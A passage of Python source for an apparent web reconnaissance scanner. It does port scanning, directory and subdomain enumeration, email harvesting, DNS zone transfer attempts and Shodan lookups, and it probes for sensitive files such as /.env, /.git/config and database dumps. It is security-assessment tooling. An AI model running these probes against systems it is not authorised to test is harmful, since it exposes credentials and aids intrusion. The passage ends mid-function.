        return frontend_info

    async def _analyze_network_protocol(self, url: str, headers: Dict) -> Dict:
        """🌐 Network & Protocol Analysis"""
        network_info = {}
        
        try:
            # 1. HTTP Version Detection
            network_info['http_version'] = self._detect_http_version(headers)
            
            # 2. Protocol Security Assessment
            network_info['protocol_security'] = self._assess_protocol_security(url, headers)
            
            # 3. Network Latency & Performance
            network_info['network_performance'] = self._analyze_network_performance(headers)
            
            # 4. DNS Configuration
            network_info['dns_config'] = await self._analyze_dns_configuration(url)
            
            # 5. Port Scanning Results
            network_info['open_ports'] = await self._perform_basic_port_scan(url)
            
            # 6. Network Security Headers
            network_info['security_headers'] = await self._analyze_security_headers(headers)
            
            # 7. Compression & Encoding
            network_info['compression_encoding'] = self._analyze_compression(headers)
            
            # 8. Cookie Configuration
            network_info['cookie_analysis'] = self._analyze_cookies(headers)
            
            # 9. CORS Configuration
            network_info['cors_config'] = self._analyze_cors_configuration(headers)
            
            # 10. Network Infrastructure
            network_info['network_infrastructure'] = self._analyze_network_infrastructure(headers)
            
        except Exception as e:
            self.config.logger.debug(f"Network protocol analysis error: {e}")
        
        return network_info

    async def _perform_reconnaissance(self, url: str, content: str, headers: Dict) -> Dict:
        """🕵️ Reconnaissance & Enumeration"""
        recon_info = {}
        
        try:
            # 1. Directory & File Enumeration
            recon_info['directory_enum'] = await self._enumerate_directories(url)
            
            # 2. Subdomain Discovery
            recon_info['subdomain_discovery'] = await self._discover_subdomains(url)
            
            # 3. Email Address Harvesting
            recon_info['email_addresses'] = self._harvest_email_addresses(content)
            
            # 4. Social Media & External Links
            recon_info['external_links'] = self._analyze_external_links(content)
            
            # 5. Technology Fingerprinting
            recon_info['technology_fingerprint'] = self._comprehensive_tech_fingerprint(content, headers)
            
            # 6. Hidden Information Discovery
            recon_info['hidden_information'] = self._discover_hidden_information(content)
            
            # 7. Metadata Extraction
            recon_info['metadata'] = self._extract_metadata(content, headers)
            
            # 8. Error Page Analysis
            recon_info['error_analysis'] = await self._analyze_error_pages(url)
            
            # 9. Backup & Sensitive File Detection
            recon_info['sensitive_files'] = await self._detect_sensitive_files(url)
            
            # 10. Information Disclosure Assessment
            recon_info['information_disclosure'] = self._assess_information_disclosure(content, headers)
            
        except Exception as e:
            self.config.logger.debug(f"Reconnaissance analysis error: {e}")
        
        return recon_info

    # Helper methods for detailed analysis
    def _detect_cloud_provider(self, headers: Dict, content: str) -> str:
        """Detect cloud hosting provider"""
        providers = {
            'AWS': ['amazon', 'aws', 'cloudfront'],
            'Google Cloud': ['gcloud', 'google', 'gcp'],
            'Azure': ['azure', 'microsoft'],
            'Cloudflare': ['cloudflare', 'cf-ray'],
            'DigitalOcean': ['digitalocean'],
            'Heroku': ['heroku']
        }
        
        content_lower = content.lower() if content else ''
        headers_str = str(headers).lower()
        
        for provider, indicators in providers.items():
            if any(indicator in headers_str or indicator in content_lower for indicator in indicators):
                return provider
        
        return 'Unknown'

    def _detect_cdn(self, headers: Dict) -> str:
        """Detect CDN usage"""
        cdn_headers = ['cf-ray', 'x-cache', 'x-served-by', 'x-amz-cf-id']
        for header in cdn_headers:
            if header in headers:
                return f"Detected via {header}"
        return 'Not detected'

    def _detect_load_balancer(self, headers: Dict) -> str:
        """Detect load balancer"""
        lb_indicators = ['x-forwarded-for', 'x-real-ip', 'x-load-balancer']
        for indicator in lb_indicators:
            if indicator in headers:
                return f"Detected via {indicator}"
        return 'Not detected'

    def _detect_waf(self, headers: Dict, content: str) -> str:
        """Detect Web Application Firewall"""
        waf_indicators = {
            'cloudflare': ['cf-ray', 'cloudflare'],
            'akamai': ['akamai'],
            'aws waf': ['aws'],
            'incapsula': ['incap', 'visid_incap']
        }
        
        headers_str = str(headers).lower()
        content_lower = content.lower() if content else ''
        
        for waf, indicators in waf_indicators.items():
            if any(indicator in headers_str or indicator in content_lower for indicator in indicators):
                return waf.title()
        
        return 'Not detected'

    def _analyze_hosting_environment(self, headers: Dict, content: str) -> Dict:
        """Analyze hosting environment details"""
        return {
            'containerized': 'docker' in str(headers).lower() or 'kubernetes' in str(content).lower(),
            'serverless': 'lambda' in str(headers).lower() or 'vercel' in str(headers).lower(),
            'shared_hosting': 'cpanel' in str(content).lower() if content else False
        }

    def _detect_programming_language(self, headers: Dict, content: str) -> str:
        """Detect backend programming language"""
        language_indicators = {
            'PHP': ['php', 'x-powered-by: php'],
            'Python': ['django', 'flask', 'python'],
            'Java': ['java', 'jsessionid', 'tomcat'],
            'Node.js': ['express', 'node'],
            'Ruby': ['ruby', 'rails'],
            'C#/.NET': ['asp.net', 'aspnet', 'iis'],
            'Go': ['golang', 'go'],
            'Rust': ['rust'],
            'Scala': ['scala', 'akka']
        }
        
        headers_str = str(headers).lower()
        content_lower = content.lower() if content else ''
        
        for lang, indicators in language_indicators.items():
            if any(indicator in headers_str or indicator in content_lower for indicator in indicators):
                return lang
        
        return 'Unknown'

    def _detect_web_framework(self, headers: Dict, content: str) -> str:
        """Detect web framework"""
        framework_indicators = {
            'Laravel': ['laravel'],
            'Django': ['django', 'csrf'],
            'Flask': ['flask'],
            'Express.js': ['express'],
            'Spring': ['spring'],
            'Rails': ['rails', 'ruby'],
            'ASP.NET': ['asp.net', 'aspnet'],
            'Symfony': ['symfony'],
            'CodeIgniter': ['codeigniter']
        }
        
        headers_str = str(headers).lower()
        content_lower = content.lower() if content else ''
        
        detected_frameworks = []
        for framework, indicators in framework_indicators.items():
            if any(indicator in headers_str or indicator in content_lower for indicator in indicators):
                detected_frameworks.append(framework)
        
        return ', '.join(detected_frameworks) if detected_frameworks else 'Unknown'

    def _detect_database_technology(self, content: str, headers: Dict) -> List[str]:
        """Detect database technology hints"""
        db_indicators = {
            'MySQL': ['mysql'],
            'PostgreSQL': ['postgres', 'postgresql'],
            'MongoDB': ['mongodb', 'mongo'],
            'Redis': ['redis'],
            'SQLite': ['sqlite'],
            'Oracle': ['oracle'],
            'Microsoft SQL Server': ['mssql', 'sqlserver']
        }
        
        detected_dbs = []
        content_lower = content.lower() if content else ''
        
        for db, indicators in db_indicators.items():
            if any(indicator in content_lower for indicator in indicators):
                detected_dbs.append(db)
        
        return detected_dbs

    def _detect_application_server(self, headers: Dict) -> str:
        """Detect application server"""
        server_indicators = {
            'Apache Tomcat': ['tomcat'],
            'Nginx': ['nginx'],
            'Apache': ['apache'],
            'IIS': ['iis'],
            'Jetty': ['jetty'],
            'Undertow': ['undertow'],
            'Gunicorn': ['gunicorn'],
            'uWSGI': ['uwsgi']
        }
        
        server_header = headers.get('Server', '').lower()
        
        for server, indicators in server_indicators.items():
            if any(indicator in server_header for indicator in indicators):
                return server
        
        return 'Unknown'

    def _detect_api_technology(self, content: str, headers: Dict) -> Dict:
        """Detect API technology and endpoints"""
        api_info = {
            'rest_api': '/api/' in content if content else False,
            'graphql': 'graphql' in content.lower() if content else False,
            'websocket': 'websocket' in content.lower() if content else False,
            'content_type': headers.get('Content-Type', 'Unknown')
        }
        return api_info

    def _analyze_session_management(self, headers: Dict) -> Dict:
        """Analyze session management configuration"""
        cookies = headers.get('Set-Cookie', '')
        return {
            'session_cookies': 'sessionid' in cookies or 'jsessionid' in cookies,
            'secure_flag': 'Secure' in cookies,
            'httponly_flag': 'HttpOnly' in cookies,
            'samesite_attribute': 'SameSite' in cookies
        }

    def _detect_authentication_system(self, headers: Dict, content: str) -> Dict:
        """Detect authentication system"""
        auth_indicators = {
            'oauth': 'oauth' in content.lower() if content else False,
            'saml': 'saml' in content.lower() if content else False,
            'jwt': 'jwt' in content.lower() if content else False,
            'basic_auth': 'WWW-Authenticate' in headers,
            'bearer_token': 'Bearer' in str(headers)
        }
        return auth_indicators

    def _analyze_caching_strategy(self, headers: Dict) -> Dict:
        """Analyze caching strategy"""
        return {
            'cache_control': headers.get('Cache-Control', 'Not set'),
            'etag': headers.get('ETag', 'Not set'),
            'expires': headers.get('Expires', 'Not set'),
            'last_modified': headers.get('Last-Modified', 'Not set')
        }

    def _analyze_backend_security(self, headers: Dict, content: str) -> Dict:
        """Analyze backend security measures"""
        return {
            'csrf_protection': 'csrf' in content.lower() if content else False,
            'xss_protection': headers.get('X-XSS-Protection', 'Not set'),
            'content_type_options': headers.get('X-Content-Type-Options', 'Not set'),
            'frame_options': headers.get('X-Frame-Options', 'Not set')
        }

    def _detect_microservices(self, headers: Dict, content: str) -> Dict:
        """Detect microservices architecture indicators"""
        return {
            'service_mesh': 'istio' in str(headers).lower() or 'envoy' in str(headers).lower(),
            'api_gateway': '/gateway/' in content if content else False,
            'service_discovery': 'consul' in content.lower() if content else False
        }

    def _detect_js_frameworks(self, content: str) -> List[str]:
        """Detect JavaScript frameworks"""
        if not content:
            return []
            
        js_frameworks = {
            'React': ['react', '_reactInternalFiber'],
            'Vue.js': ['vue.js', '__vue__'],
            'Angular': ['angular', 'ng-'],
            'jQuery': ['jquery', '$'],
            'Svelte': ['svelte'],
            'Ember.js': ['ember'],
            'Backbone.js': ['backbone']
        }
        
        detected = []
        content_lower = content.lower()
        
        for framework, indicators in js_frameworks.items():
            if any(indicator in content_lower for indicator in indicators):
                detected.append(framework)
        
        return detected

    def _detect_css_frameworks(self, content: str) -> List[str]:
        """Detect CSS frameworks"""
        if not content:
            return []
            
        css_frameworks = {
            'Bootstrap': ['bootstrap'],
            'Foundation': ['foundation'],
            'Bulma': ['bulma'],
            'Tailwind CSS': ['tailwind'],
            'Material UI': ['material-ui', 'mui'],
            'Semantic UI': ['semantic-ui']
        }
        
        detected = []
        content_lower = content.lower()
        
        for framework, indicators in css_frameworks.items():
            if any(indicator in content_lower for indicator in indicators):
                detected.append(framework)
        
        return detected

    def _detect_build_tools(self, content: str) -> List[str]:
        """Detect frontend build tools"""
        if not content:
            return []
            
        build_tools = {
            'Webpack': ['webpack'],
            'Vite': ['vite'],
            'Parcel': ['parcel'],
            'Rollup': ['rollup'],
            'Gulp': ['gulp'],
            'Grunt': ['grunt']
        }
        
        detected = []
        content_lower = content.lower()
        
        for tool, indicators in build_tools.items():
            if any(indicator in content_lower for indicator in indicators):
                detected.append(tool)
        
        return detected

    def _detect_package_managers(self, content: str) -> List[str]:
        """Detect package managers"""
        if not content:
            return []
            
        package_managers = ['npm', 'yarn', 'pnpm', 'bower']
        detected = []
        content_lower = content.lower()
        
        for pm in package_managers:
            if pm in content_lower:
                detected.append(pm.upper())
        
        return detected

    def _detect_ui_libraries(self, content: str) -> List[str]:
        """Detect UI component libraries"""
        if not content:
            return []
            
        ui_libraries = {
            'Material-UI': ['material-ui', '@mui'],
            'Ant Design': ['antd', 'ant-design'],
            'React Bootstrap': ['react-bootstrap'],
            'Chakra UI': ['chakra-ui'],
            'Mantine': ['mantine']
        }
        
        detected = []
        content_lower = content.lower()
        
        for lib, indicators in ui_libraries.items():
            if any(indicator in content_lower for indicator in indicators):
                detected.append(lib)
        
        return detected

    def _analyze_frontend_security(self, content: str, headers: Dict) -> Dict:
        """Analyze frontend security features"""
        return {
            'csp_header': headers.get('Content-Security-Policy', 'Not set'),
            'sri_integrity': 'integrity=' in content if content else False,
            'https_enforcement': 'https://' in content if content else False
        }

    def _detect_pwa_features(self, content: str, headers: Dict) -> Dict:
        """Detect Progressive Web App features"""
        if not content:
            return {'manifest': False, 'service_worker': False}
            
        return {
            'manifest': 'manifest.json' in content,
            'service_worker': 'serviceworker' in content.lower() or 'sw.js' in content
        }

    def _detect_spa_indicators(self, content: str) -> bool:
        """Detect Single Page Application indicators"""
        if not content:
            return False
            
        spa_indicators = ['history.pushstate', 'router', 'single-page']
        content_lower = content.lower()
        
        return any(indicator in content_lower for indicator in spa_indicators)

    def _analyze_frontend_performance(self, content: str, headers: Dict) -> Dict:
        """Analyze frontend performance optimizations"""
        return {
            'compression_enabled': 'gzip' in headers.get('Content-Encoding', ''),
            'caching_headers': 'Cache-Control' in headers,
            'minification': '.min.' in content if content else False,
            'lazy_loading': 'lazy' in content if content else False
        }

    def _detect_third_party_integrations(self, content: str) -> List[str]:
        """Detect third-party integrations"""
        if not content:
            return []
            
        integrations = {
            'Google Analytics': ['google-analytics', 'gtag'],
            'Facebook Pixel': ['facebook', 'fbevents'],
            'Stripe': ['stripe'],
            'PayPal': ['paypal'],
            'Disqus': ['disqus'],
            'Zendesk': ['zendesk'],
            'Intercom': ['intercom']
        }
        
        detected = []
        content_lower = content.lower()
        
        for integration, indicators in integrations.items():
            if any(indicator in content_lower for indicator in indicators):
                detected.append(integration)
        
        return detected

    def _detect_http_version(self, headers: Dict) -> str:
        """Detect HTTP version"""
        if 'HTTP/2' in str(headers) or 'h2' in str(headers):
            return 'HTTP/2'
        elif 'HTTP/3' in str(headers) or 'h3' in str(headers):
            return 'HTTP/3'
        else:
            return 'HTTP/1.1'

    def _assess_protocol_security(self, url: str, headers: Dict) -> Dict:
        """Assess protocol security"""
        return {
            'https_enabled': url.startswith('https://'),
            'hsts_header': 'Strict-Transport-Security' in headers,
            'tls_version': self._detect_tls_version(headers)
        }

    def _detect_tls_version(self, headers: Dict) -> str:
        """Detect TLS version (simplified)"""
        # This would require more sophisticated analysis in practice
        return 'TLS 1.2+' if any('tls' in str(v).lower() for v in headers.values()) else 'Unknown'

    def _analyze_network_performance(self, headers: Dict) -> Dict:
        """Analyze network performance metrics"""
        return {
            'server_timing': headers.get('Server-Timing', 'Not provided'),
            'content_length': headers.get('Content-Length', 'Unknown'),
            'transfer_encoding': headers.get('Transfer-Encoding', 'Standard')
        }

    async def _analyze_dns_configuration(self, url: str) -> Dict:
        """Analyze DNS configuration"""
        domain = urlparse(url).netloc
        dns_info = {'domain': domain}
        
        try:
            # Basic DNS resolution
            ip = socket.gethostbyname(domain)
            dns_info['a_record'] = ip
        except socket.gaierror:
            dns_info['a_record'] = 'Resolution failed'
        
        return dns_info

    async def _perform_basic_port_scan(self, url: str) -> List[int]:
        """Perform basic port scan on common ports"""
        domain = urlparse(url).netloc
        common_ports = [80, 443, 21, 22, 25, 53, 110, 143, 993, 995]
        open_ports = []
        
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((domain, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                continue
        
        return open_ports

    def _analyze_security_headers(self, headers: Dict) -> Dict:
        """Analyze security headers"""
        security_headers = {
            'X-Frame-Options': headers.get('X-Frame-Options', 'Missing'),
            'X-Content-Type-Options': headers.get('X-Content-Type-Options', 'Missing'),
            'X-XSS-Protection': headers.get('X-XSS-Protection', 'Missing'),
            'Strict-Transport-Security': headers.get('Strict-Transport-Security', 'Missing'),
            'Content-Security-Policy': headers.get('Content-Security-Policy', 'Missing'),
            'Referrer-Policy': headers.get('Referrer-Policy', 'Missing')
        }
        return security_headers

    def _analyze_compression(self, headers: Dict) -> Dict:
        """Analyze compression and encoding"""
        return {
            'content_encoding': headers.get('Content-Encoding', 'None'),
            'accept_encoding': headers.get('Accept-Encoding', 'Not specified'),
            'vary_header': headers.get('Vary', 'Not set')
        }

    def _analyze_cookies(self, headers: Dict) -> Dict:
        """Analyze cookie configuration"""
        set_cookie = headers.get('Set-Cookie', '')
        return {
            'cookies_present': bool(set_cookie),
            'secure_cookies': 'Secure' in set_cookie,
            'httponly_cookies': 'HttpOnly' in set_cookie,
            'samesite_policy': 'SameSite' in set_cookie
        }

    def _analyze_cors_configuration(self, headers: Dict) -> Dict:
        """Analyze CORS configuration"""
        return {
            'access_control_allow_origin': headers.get('Access-Control-Allow-Origin', 'Not set'),
            'access_control_allow_methods': headers.get('Access-Control-Allow-Methods', 'Not set'),
            'access_control_allow_headers': headers.get('Access-Control-Allow-Headers', 'Not set'),
            'access_control_allow_credentials': headers.get('Access-Control-Allow-Credentials', 'Not set')
        }

    def _analyze_network_infrastructure(self, headers: Dict) -> Dict:
        """Analyze network infrastructure"""
        return {
            'edge_computing': any(edge in str(headers).lower() for edge in ['cloudflare', 'fastly', 'akamai']),
            'proxy_detected': 'X-Forwarded-For' in headers or 'X-Real-IP' in headers,
            'load_balancing': 'X-Load-Balancer' in headers
        }

    async def _enumerate_directories(self, url: str) -> List[str]:
        """Enumerate common directories"""
        common_dirs = ['/admin', '/api', '/backup', '/config', '/test', '/dev']
        found_dirs = []
        
        for directory in common_dirs:
            try:
                test_url = url.rstrip('/') + directory
                result = await self.session.get(test_url)
                if result[0] and result[0] not in [404, 403]:
                    found_dirs.append(directory)
            except:
                continue
        
        return found_dirs

    async def _discover_subdomains(self, url: str) -> List[str]:
        """Discover subdomains (basic implementation)"""
        domain = urlparse(url).netloc
        common_subdomains = ['www', 'api', 'admin', 'mail', 'ftp', 'blog', 'shop']
        found_subdomains = []
        
        for subdomain in common_subdomains:
            try:
                test_domain = f"{subdomain}.{domain}"
                socket.gethostbyname(test_domain)
                found_subdomains.append(test_domain)
            except socket.gaierror:
                continue
        
        return found_subdomains

    def _harvest_email_addresses(self, content: str) -> List[str]:
        """Harvest email addresses from content"""
        if not content:
            return []
            
        import re
        email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
        emails = re.findall(email_pattern, content)
        return list(set(emails))  # Remove duplicates

    def _analyze_external_links(self, content: str) -> Dict:
        """Analyze external links and social media presence"""
        if not content:
            return {}
            
        import re
        
        # Extract external links
        link_pattern = r'https?://(?:www\.)?([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})'
        external_domains = re.findall(link_pattern, content)
        
        # Social media detection
        social_media = {
            'facebook': 'facebook.com' in content,
            'twitter': 'twitter.com' in content or 'x.com' in content,
            'linkedin': 'linkedin.com' in content,
            'instagram': 'instagram.com' in content,
            'youtube': 'youtube.com' in content
        }
        
        return {
            'external_domains': list(set(external_domains)),
            'social_media': social_media
        }

    def _comprehensive_tech_fingerprint(self, content: str, headers: Dict) -> Dict:
        """Comprehensive technology fingerprinting"""
        return {
            'cms_detected': self._detect_cms(content, headers),
            'analytics_tools': self._detect_analytics(content),
            'advertising_networks': self._detect_advertising(content),
            'cdn_services': self._detect_cdn_services(content, headers)
        }

    def _detect_cms(self, content: str, headers: Dict) -> str:
        """Detect Content Management System"""
        if not content:
            return 'Unknown'
            
        cms_indicators = {
            'WordPress': ['wp-content', 'wp-includes', 'wordpress'],
            'Drupal': ['drupal', '/sites/default/'],
            'Joomla': ['joomla', '/components/'],
            'Magento': ['magento', 'mage/'],
            'Shopify': ['shopify', 'cdn.shopify'],
            'Squarespace': ['squarespace'],
            'Wix': ['wix.com'],
            'Ghost': ['ghost']
        }
        
        content_lower = content.lower()
        headers_str = str(headers).lower()
        
        for cms, indicators in cms_indicators.items():
            if any(indicator in content_lower or indicator in headers_str for indicator in indicators):
                return cms
        
        return 'Unknown'

    def _detect_analytics(self, content: str) -> List[str]:
        """Detect analytics tools"""
        if not content:
            return []
            
        analytics_tools = {
            'Google Analytics': ['google-analytics', 'gtag', 'ga('],
            'Adobe Analytics': ['adobe', 'omniture'],
            'Hotjar': ['hotjar'],
            'Mixpanel': ['mixpanel'],
            'Segment': ['segment.com']
        }
        
        detected = []
        content_lower = content.lower()
        
        for tool, indicators in analytics_tools.items():
            if any(indicator in content_lower for indicator in indicators):
                detected.append(tool)
        
        return detected

    def _detect_advertising(self, content: str) -> List[str]:
        """Detect advertising networks"""
        if not content:
            return []
            
        ad_networks = {
            'Google AdSense': ['googlesyndication', 'adsense'],
            'Google Ad Manager': ['doubleclick'],
            'Facebook Ads': ['facebook.com/tr'],
            'Amazon Associates': ['amazon-adsystem']
        }
        
        detected = []
        content_lower = content.lower()
        
        for network, indicators in ad_networks.items():
            if any(indicator in content_lower for indicator in indicators):
                detected.append(network)
        
        return detected

    def _detect_cdn_services(self, content: str, headers: Dict) -> List[str]:
        """Detect CDN services"""
        cdn_services = ['cloudflare', 'fastly', 'maxcdn', 'keycdn', 'jsdelivr', 'unpkg']
        detected = []
        
        content_lower = content.lower() if content else ''
        headers_str = str(headers).lower()
        
        for cdn in cdn_services:
            if cdn in content_lower or cdn in headers_str:
                detected.append(cdn.title())
        
        return detected

    def _discover_hidden_information(self, content: str) -> Dict:
        """Discover hidden information in content"""
        if not content:
            return {}
            
        return {
            'comments_found': '<!--' in content,
            'debug_info': any(debug in content.lower() for debug in ['debug', 'trace', 'error']),
            'version_info': any(version in content.lower() for version in ['version', 'v1.', 'v2.']),
            'api_keys_exposed': any(key in content.lower() for key in ['api_key', 'secret', 'token'])
        }

    def _extract_metadata(self, content: str, headers: Dict) -> Dict:
        """Extract metadata from content and headers"""
        metadata = {
            'last_modified': headers.get('Last-Modified', 'Not provided'),
            'etag': headers.get('ETag', 'Not provided'),
            'content_type': headers.get('Content-Type', 'Not provided')
        }
        
        if content:
            import re
            # Extract meta tags
            meta_pattern = r'<meta\s+(?:name|property)=["\']([^"\']+)["\'].*?content=["\']([^"\']+)["\']'
            meta_tags = re.findall(meta_pattern, content, re.IGNORECASE)
            metadata['meta_tags'] = dict(meta_tags)
        
        return metadata

    async def _analyze_error_pages(self, url: str) -> Dict:
        """Analyze error pages for information disclosure"""
        error_info = {}
        
        try:
            # Test 404 page
            error_url = url.rstrip('/') + '/nonexistent-page-' + str(hash(url))[-6:]
            result = await self.session.get(error_url)
            if result[0] == 404 and result[2]:
                error_info['404_page_info'] = len(result[2]) > 1000  # Verbose error page
        except:
            pass
        
        return error_info

    async def _detect_sensitive_files(self, url: str) -> List[str]:
        """Detect sensitive files and backups"""
        sensitive_files = [
            '/robots.txt', '/sitemap.xml', '/.env', '/config.php',
            '/backup.zip', '/database.sql', '/.git/config'
        ]
        
        found_files = []
        for file_path in sensitive_files:
            try:
                test_url = url.rstrip('/') + file_path
                result = await self.session.get(test_url)
                if result[0] and result[0] == 200:
                    found_files.append(file_path)
            except:
                continue
        
        return found_files

    def _assess_information_disclosure(self, content: str, headers: Dict) -> Dict:
        """Assess information disclosure risks"""
        return {
            'server_version_disclosed': any(server in headers.get('Server', '') for server in ['Apache/', 'nginx/', 'IIS/']),
            'powered_by_disclosed': 'X-Powered-By' in headers,
            'directory_listing': 'Index of /' in content if content else False,
            'stack_traces': any(trace in content.lower() if content else False for trace in ['traceback', 'stack trace', 'exception'])
        }

    # === Enhanced Reconnaissance & Vulnerability Scanning Methods ===

    async def _advanced_shodan_reconnaissance(self, url: str) -> Dict:
        """Enhanced Shodan reconnaissance for comprehensive intelligence gathering"""
        if not SHODAN_AVAILABLE:
            return {'error': 'Shodan library not available'}
        
        try:
            domain = urlparse(url).netloc
            ip_address = socket.gethostbyname(domain)
            
            # Note: Requires SHODAN_API_KEY environment variable
            api_key = os.getenv('SHODAN_API_KEY')
            if not api_key:
                return {'info': 'Shodan API key not configured'}
            
            api = shodan.Shodan(api_key)
            
            # Comprehensive Shodan intelligence
            host_info = api.host(ip_address)
            
            return {
                'ip': ip_address,
                'organization': host_info.get('org', 'Unknown'),
                'country': host_info.get('country_name', 'Unknown'),
                'city': host_info.get('city', 'Unknown'),
                'isp': host_info.get('isp', 'Unknown'),
                'asn': host_info.get('asn', 'Unknown'),
                'open_ports': [service['port'] for service in host_info.get('data', [])],
                'services': [f"{service.get('product', 'Unknown')} {service.get('version', '')}" 
                           for service in host_info.get('data', [])],
                'vulnerabilities': host_info.get('vulns', []),
                'last_update': host_info.get('last_update', 'Unknown'),
                'hostnames': host_info.get('hostnames', [])
            }
        except Exception as e:
            self.config.logger.debug(f"Shodan reconnaissance error: {e}")
            return {'error': str(e)}

    async def _advanced_whois_analysis(self, url: str) -> Dict:
        """Enhanced WHOIS analysis for domain intelligence"""
        if not WHOIS_AVAILABLE:
            return {'error': 'WHOIS library not available'}
        
        try:
            domain = urlparse(url).netloc
            whois_info = whois.whois(domain)
            
            return {
                'domain_name': whois_info.domain_name if hasattr(whois_info, 'domain_name') else 'Unknown',
                'registrar': whois_info.registrar if hasattr(whois_info, 'registrar') else 'Unknown',
                'creation_date': str(whois_info.creation_date) if hasattr(whois_info, 'creation_date') else 'Unknown',
                'expiration_date': str(whois_info.expiration_date) if hasattr(whois_info, 'expiration_date') else 'Unknown',
                'name_servers': whois_info.name_servers if hasattr(whois_info, 'name_servers') else [],
                'status': whois_info.status if hasattr(whois_info, 'status') else 'Unknown',
                'country': whois_info.country if hasattr(whois_info, 'country') else 'Unknown',
                'organization': whois_info.org if hasattr(whois_info, 'org') else 'Unknown'
            }
        except Exception as e:
            self.config.logger.debug(f"WHOIS analysis error: {e}")
            return {'error': str(e)}

    async def _advanced_technology_detection(self, url: str) -> Dict:
        """Enhanced technology detection using BuiltWith"""
        if not BUILTWITH_AVAILABLE:
            return {'error': 'BuiltWith library not available'}
        
        try:
            domain = urlparse(url).netloc
            tech_info = builtwith.parse(url)
            
            return {
                'web_servers': tech_info.get('web-servers', []),
                'programming_languages': tech_info.get('programming-languages', []),
                'javascript_frameworks': tech_info.get('javascript-frameworks', []),
                'cms': tech_info.get('cms', []),
                'analytics': tech_info.get('analytics', []),
                'advertising': tech_info.get('advertising', []),
                'cdn': tech_info.get('cdn', []),
                'ssl_certificates': tech_info.get('ssl-certificates', []),
                'hosting': tech_info.get('hosting', []),
                'payment_processors': tech_info.get('payment-processors', [])
            }
        except Exception as e:
            self.config.logger.debug(f"Technology detection error: {e}")
            return {'error': str(e)}

    async def _wayback_machine_analysis(self, url: str) -> Dict:
        """Historical URL analysis using Wayback Machine"""
        if not WAYBACK_AVAILABLE:
            return {'error': 'Wayback library not available'}
        
        try:
            wayback = waybackpy.Url(url, "DuskProbe/5.0")
            
            # Get historical snapshots
            snapshots = []
            try:
                for snapshot in wayback.snapshots():
                    snapshots.append({
                        'timestamp': str(snapshot.timestamp),
                        'archive_url': snapshot.archive_url
                    })
                    if len(snapshots) >= 10:  # Limit to recent 10 snapshots
                        break
            except:
                pass
            
            return {
                'total_snapshots': len(snapshots),
                'recent_snapshots': snapshots,
                'oldest_snapshot': wayback.oldest().timestamp if snapshots else None,
                'newest_snapshot': wayback.newest().timestamp if snapshots else None
            }
        except Exception as e:
            self.config.logger.debug(f"Wayback analysis error: {e}")
            return {'error': str(e)}

    async def _advanced_dns_reconnaissance(self, url: str) -> Dict:
        """Enhanced DNS reconnaissance using dnspython"""
        if not DNS_AVAILABLE:
            return {'error': 'DNS library not available'}
        
        try:
            domain = urlparse(url).netloc
            dns_info = {}
            
            # Common DNS record types
            record_types = ['A', 'AAAA', 'CNAME', 'MX', 'NS', 'TXT', 'SOA', 'PTR']
            
            for record_type in record_types:
                try:
                    answers = dns.resolver.resolve(domain, record_type)
                    dns_info[record_type] = [str(rdata) for rdata in answers]
                except:
                    dns_info[record_type] = []
            
            # Zone transfer attempt
            try:
                ns_answers = dns.resolver.resolve(domain, 'NS')
                for ns in ns_answers:
                    try:
                        zone = dns.zone.from_xfr(dns.query.xfr(str(ns), domain))
                        dns_info['zone_transfer'] = f"Possible from {ns}"
                        break
                    except:
                        continue
                else:
                    dns_info['zone_transfer'] = 'Not possible'
            except:
                dns_info['zone_transfer'] = 'Unknown'
            
            return dns_info
        except Exception as e:
            self.config.logger.debug(f"DNS reconnaissance error: {e}")
            return {'error': str(e)}

    async def _advanced_ssl_analysis(self, url: str) -> Dict:
        """Enhanced SSL/TLS analysis using SSLyze"""
        if not SSLYZE_AVAILABLE or not url.startswith('https://'):
            return {'error': 'SSLyze not available or non-HTTPS URL'}
        
        try:
            domain = urlparse(url).netloc
            port = 443
            
            # Create server location
            server_location = ServerNetworkLocation(domain, port)
            server_scan_req = ServerScanRequest(
                server_info=server_location,
                scan_commands={ScanCommand.CERTIFICATE_INFO, ScanCommand.SSL_2_0_CIPHER_SUITES, 
                             ScanCommand.SSL_3_0_CIPHER_SUITES, ScanCommand.TLS_1_0_CIPHER_SUITES,
                             ScanCommand.TLS_1_1_CIPHER_SUITES, ScanCommand.TLS_1_2_CIPHER_SUITES,
                             ScanCommand.TLS_1_3_CIPHER_SUITES}
            )
            
            scanner = Scanner()
            scan_result = scanner.get_results()
            
            # Process SSL scan results
            ssl_info = {
                'certificate_info': {},
                'protocol_support': {},
                'cipher_suites': {},
                'vulnerabilities': []
            }
            
            for scan_command, result in scan_result.scan_commands_results.items():
                if scan_command == ScanCommand.CERTIFICATE_INFO:
                    cert_deployments = result.certificate_deployments
                    if cert_deployments:
                        cert = cert_deployments[0].received_certificate_chain[0]
                        ssl_info['certificate_info'] = {
                            'subject': cert.subject.rfc4514_string(),
                            'issuer': cert.issuer.rfc4514_string(),
                            'not_valid_before': str(cert.not_valid_before),
                            'not_valid_after': str(cert.not_valid_after),
                            'signature_algorithm': cert.signature_algorithm_oid._name,
                            'key_size': cert.public_key().key_size if hasattr(cert.public_key(), 'key_size') else 'Unknown'
                        }
            
            return ssl_info
        except Exception as e:
            self.config.logger.debug(f"SSL analysis error: {e}")
            return {'error': str(e)}

    async def _advanced_http_analysis(self, url: str) -> Dict:
        """Enhanced HTTP analysis using httpx"""
        if not HTTPX_AVAILABLE:
            return {'error': 'HTTPX library not available'}
        
        try:
            async with httpx.AsyncClient(timeout=5) as client:
                response = await client.get(url, follow_redirects=True)
                
                return {
                    'http_version': f"HTTP/{response.http_version}",
                    'status_code': response.status_code,
                    'response_headers': dict(response.headers),
                    'redirect_chain': [str(req.url) for req in response.history],
                    'final_url': str(response.url),
                    'content_encoding': response.headers.get('content-encoding', 'none'),
                    'server_header': response.headers.get('server', 'unknown'),
                    'cookies': [cookie.name for cookie in response.cookies],
                    'security_headers': {
                        'strict-transport-security': response.headers.get('strict-transport-security', 'missing'),
                        'content-security-policy': response.headers.get('content-security-policy', 'missing'),
                        'x-frame-options': response.headers.get('x-frame-options', 'missing'),
                        'x-content-type-options': response.headers.get('x-content-type-options', 'missing'),
                        'x-xss-protection': response.headers.get('x-xss-protection', 'missing'),
